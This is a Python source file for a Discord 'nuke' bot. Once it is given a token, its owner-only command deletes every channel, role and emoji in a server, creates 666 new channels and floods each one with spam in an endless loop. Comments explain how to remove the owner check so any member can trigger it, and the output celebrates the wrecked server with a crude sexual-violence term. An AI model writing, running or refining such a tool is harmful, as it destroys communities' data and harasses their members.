import discord
from discord.ext import commands
import random
from colorama import Fore
import os
import time
from pystyle import *

os.system('cls')
time.sleep(1)
os.system("title Stanford ┃ By: Karma")
os.system('cls')
time.sleep(1)
token = (Write.Input(f"""
╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
╔══Insert token\n╚══► """, Colors.yellow_to_red, interval=0.00001))
spamc = (Write.Input(f'╔══What should be the name of the guilds\n╚══► ', Colors.yellow_to_red, interval=0.000001))
spammsg = (Write.Input(f'╔══What message would you like to spam\n╚══► ', Colors.yellow_to_red, interval=0.000001))


spm_chnl =  [spamc]
spm_msg = [spammsg]

client = commands.Bot(command_prefix="!")

os.system('cls')
time.sleep(1)
os.system("title Stanford ~ Online ┃ By: Karma")
@client.event
async def on_ready():
   Write.Print(f"""
╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
Github: @whoresmad\nCurrent Discord: .gg/broke \n
╔══Bot - {client.user}\n╚══► Connected
╔══Prefix\n╚══► " ! "
╔══Commands\n╚══► cry = Dropping The Nuke. | stop = To stop the nuke.
 """, Colors.red_to_yellow, interval=0.00001)
   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.competing, name= f".gg/broke | Karma"))

@client.command()
@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE NUKE!!)
async def stop(ctx): #~ stop command
    await ctx.bot.logout()
    os.system("cls")
    os.system("title Stanford ~ Offline ┃ By: Karma")
    print (Fore.BLUE + f"{client.user.name} has logged out successfully.")
    os.system("pause >nul")
    os.system("cls")

@client.command()
@commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STARTS THE NUKE!!)
async def cry(ctx): #~ start command / nuke
    await ctx.message.delete()
    guild = ctx.guild
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"{channel.name}[✅] Has been deleted succesfull.")
      except:
        print(Fore.RED + f"{channel.name}[❌] Has not been deleted! (missing perms?)")
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.GREEN + f"{role.name}[✅] Has been deleted succesfull.")
     except:
       print(Fore.RED + f"{role.name}[❌] Has not been deleted! (missing perms?) OR (bot role)?")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.GREEN + f"{emoji.name}[✅] Has been deleted succesfull.")
     except:
       print(Fore.RED + f"{emoji.name}[❌] Has not been Deleted! (missing perms?)")
    await guild.create_text_channel("github is clownist")
    amount = 666
    for i in range(amount):
       await guild.create_text_channel(random.choice(spm_chnl))
    print(f"{Fore.MAGENTA}[☭] Raped {guild.name} Successfully😈")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spm_msg))
client.run(token, bot=True)
